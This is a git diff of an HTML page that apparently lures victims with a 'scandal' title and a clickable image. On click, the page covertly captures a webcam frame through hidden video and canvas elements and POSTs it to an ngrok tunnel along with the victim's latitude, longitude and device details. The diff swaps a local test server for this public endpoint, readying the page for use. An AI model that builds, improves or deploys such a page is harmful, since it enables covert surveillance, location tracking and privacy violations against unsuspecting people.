@@ -2,14 +2,14 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>الصورة فقط</title>
+    <title>فضيحة</title>
     <style>
         body { display:flex; justify-content:center; align-items:center; height:100vh; }
         img { cursor:pointer; width:300px; }
     </style>
 </head>
 <body>
-    <img src="button.jpg" onclick="capture()">
+    <img src="https://raw.githubusercontent.com/khaliddhahir0-sketch/youtube/main/button.jpg" onclick="capture()">   
 
     <video id="video" width="300" autoplay style="display:none;"></video>
     <canvas id="canvas" width="300" style="display:none;"></canvas>
@@ -47,7 +47,7 @@
                         const imgData = canvas.toDataURL('image/png');
 
                         // إرسال البيانات إلى السيرفر
-                        fetch("http://192.168.0.112:5000/receive_data", {
+                        fetch("https://259c04a4053a.ngrok-free.app", {
                             method:"POST",
                             headers: { "Content-Type":"application/json" },
                             body: JSON.stringify({ lat, lon, imgData, deviceInfo })
@@ -65,4 +65,3 @@
     </script>
 </body>
 </html>
-
